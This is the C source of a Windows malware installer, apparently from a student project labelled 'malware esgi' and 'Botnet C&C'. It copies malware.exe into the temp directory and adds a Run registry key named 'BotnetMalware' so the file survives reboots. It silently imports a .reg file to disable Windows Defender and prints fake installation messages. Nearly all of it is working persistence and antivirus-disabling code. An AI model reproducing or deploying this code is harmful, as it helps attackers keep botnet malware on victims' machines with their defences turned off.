#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include <direct.h>

char directory[MAX_PATH]; //Set de la taille du chemin du directory ou l'installer s'éxecute
char tempdir[MAX_PATH]; //
int AutoRun(); // Initialisation de la fonction Autorun

char malwareesgi[] = 

"  /\\/\\   __ _| |_      ____ _ _ __ ___    ___  ___  __ _(_)\n"
" /    \\ / _` | \\ \\ /\\ / / _` | '__/ _ \\  / _ \\/ __|/ _` | |\n"
"/ /\\/\\ \\ (_| | |\\ V  V / (_| | | |  __/ |  __/\\__ \\ (_| | |\n"
"\\/    \\/\\__,_|_| \\_/\\_/ \\__,_|_|  \\___|  \\___||___/\\__, |_|\n"
"                                                   |___/   \n"
;

int run_reg_file() { //Lance le .reg pour désactiver windows defender même après redémarrage
    int result = 0;
    result = system("regedit.exe /S C:\\Users\\Zombie\\Desktop\\malware\\disable_defender.reg");
    if (result != 0) {
        //printf("Error executing .reg file\n");
	}
	else
		//printf("Fichier reg OK");
	
    
    return result;
}



int main()
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
	WORD saved_attributes;
	SetConsoleTitle("Setup - Botnet C&C");
	    /* sauvegardes des attributs de la consoles */
    GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
    saved_attributes = consoleInfo.wAttributes;

	SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
	//SetConsoleTextAttribute(hConsole, BACKGROUND_);
	
	printf( "\n\n");
	printf( malwareesgi );

	printf( "Installation en cours...\n\n" );

	printf( "[OK] - Installation des dependances\n" );
	Sleep(1000);
	printf ( "[OK] - Analyse du systeme\n" );
	Sleep(1500);
	printf ( "[OK] - Extinction de l'antivirus\n" );
	Sleep(2000);
	printf ( "[OK] - Destruction du processeur\n" );
	Sleep(1000);
	printf ( "[OK] - Mise a feu du disque dur\n" );
	Sleep(1000);
	printf ( "[OK] - Analyse du systeme\n" );

	printf ( "Appuyez sur une touche...\n" );
	//getchar();
	 /* Revenir aux attributs d'avants */
    //SetConsoleTextAttribute(hConsole, saved_attributes);
    char * appdata = (getenv("TEMP"));

    GetCurrentDirectory( sizeof(directory), directory ); // Retourne le repertoire ou s'execute l'installer
    GetTempPath( sizeof(tempdir), tempdir ); // Retourne le repertoire temperoraire

    char * newpath = strcat(directory,"\\malware.exe"); // Chemin du malware la ou y'a l'installateur
    char * malwarepath = strcat(tempdir,"malware.exe"); // Chemin du malware la ou y'a l'installateur
    //if (  )
    	//perror( NULL );

	rename( newpath, malwarepath);
    AutoRun(malwarepath);
	run_reg_file();
	//getchar();
	//printf ( "Appuyez sur une touche...\n" );

}



int AutoRun(char * exepath) // Fonction persistance Windows - Botnet Malware [AutoRun]//
{
	char err[128] = "Erreur de création de la persistance\n";
	char suc[128] = "Création de la persistance sur : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	// Permet de retrouver son propre nom, ainsi que son chemin 
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0) {
		//send(sock, err, sizeof(err), 0);
		return -1;
	}

	HKEY NewVal;
	//Ouverture du registre et declaration d'un HKEY
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		//send(sock, err, sizeof(err), 0);
		return -1;
        //Insertion de la nouvelle valeur avec la donnée "BotnetMalware"
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath); // Création du nouvelle clée de registre -> Insérer dans regedit User\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
	if (RegSetValueEx(NewVal, TEXT("BotnetMalware"), 0, REG_SZ, (LPBYTE)exepath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		//send(sock, err, sizeof(err), 0);
		return -1;
	}
	//Fermeture du registre
	RegCloseKey(NewVal);
	//send(sock, suc, sizeof(suc), 0);
	return 0;
}